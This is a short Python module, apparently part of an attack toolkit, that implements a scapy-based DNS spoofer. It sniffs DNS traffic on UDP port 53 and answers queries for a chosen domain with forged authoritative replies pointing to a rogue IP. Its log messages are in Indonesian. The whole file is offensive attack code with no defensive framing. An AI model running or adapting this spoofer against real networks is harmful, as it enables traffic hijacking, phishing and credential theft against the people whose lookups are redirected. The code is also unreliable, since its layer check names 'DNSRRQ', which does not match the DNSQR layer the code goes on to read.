import scapy.all as scapy
from utils.logger import logger

class DNSSpoofer:
    def __init__(self, target_domain, rogue_ip):
        self.target_domain = target_domain
        self.rogue_ip = rogue_ip

    def process_packet(self, packet):
        if packet.haslayer(scapy.DNSRRQ):
            qname = packet[scapy.DNSQR].qname.decode("utf-8")
            
            if self.target_domain in qname:
                logger.info(f"[+] Mencegat DNS untuk '{qname}' -> Diarahkan ke {self.rogue_ip}")
                
                answer = scapy.DNSRR(rrname=qname, rdata=self.rogue_ip)
                spoofed_packet = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src) / \
                                 scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport) / \
                                 scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, an=answer)
                
                scapy.send(spoofed_packet, verbose=False)

    def run(self):
        logger.info(f"Memulai DNS Spoofing... Menunggu permintaan untuk '{self.target_domain}'")
        scapy.sniff(filter="udp port 53", prn=self.process_packet, store=False)